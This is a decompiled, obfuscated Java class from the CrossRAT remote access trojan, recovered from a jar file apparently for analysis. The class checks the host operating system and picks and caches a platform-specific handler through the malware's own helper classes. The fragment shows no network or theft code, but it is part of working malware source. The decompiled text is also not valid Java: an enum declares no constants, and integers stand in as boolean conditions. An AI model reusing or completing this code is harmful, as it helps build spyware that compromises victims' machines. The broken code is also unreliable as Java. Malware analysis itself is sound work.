package a;

import a.b.g;

public enum c
{
  private static a g;
  private String h;
  private String[] i;
  
  private c(String paramString1, String... paramVarArgs)
  {
    this.h = paramString1;
    this.i = paramVarArgs;
  }
  
  public final String a()
  {
    return this.h;
  }
  
  public static a b()
  {
    int k = 1;
    Object localObject1 = null;
    if (g == null)
    {
      a.a.b localb;
      if ((localb = crossrat.e.a(true)) != null) {
        localObject1 = new a.a.a(localb);
      }
      int m;
      c localc1;
      if (((m = 1) != 0 ? System.getProperty("os.name").toLowerCase().contains((localc1 = c).i[0]) : 0)) {
        localObject1 = new g(crossrat.e.d());
      }
      if (a.c.a.a(true)) {
        localObject1 = new a.c.b();
      }
      int n;
      c localc2;
      if (((n = 1) != 0 ? System.getProperty("os.name").toLowerCase().contains((localc2 = a).i[0]) : 0)) {
        localObject1 = new a.e.a();
      }
      int i1;
      Object localObject2;
      if ((i1 = 1) != 0)
      {
        String[] arrayOfString;
        int i3 = (arrayOfString = (localObject2 = d).i).length;
        for (int i2 = 0; i2 < i3; i2++) {
          localObject2 = arrayOfString[i2];
        }
      }
      if ((System.getProperty("os.name").toLowerCase().contains((CharSequence)localObject2) ? 1 : 0) != 0) {
        localObject1 = new a.d.a();
      }
      if (localObject1 == null) {
        localObject1 = new e();
      }
      if ((localObject1 instanceof d)) {
        (localObject2 = (d)localObject1).a(crossrat.e.c());
      }
      g = (a)localObject1;
    }
    else
    {
      localObject1 = g;
    }
    return (a)localObject1;
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\a\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */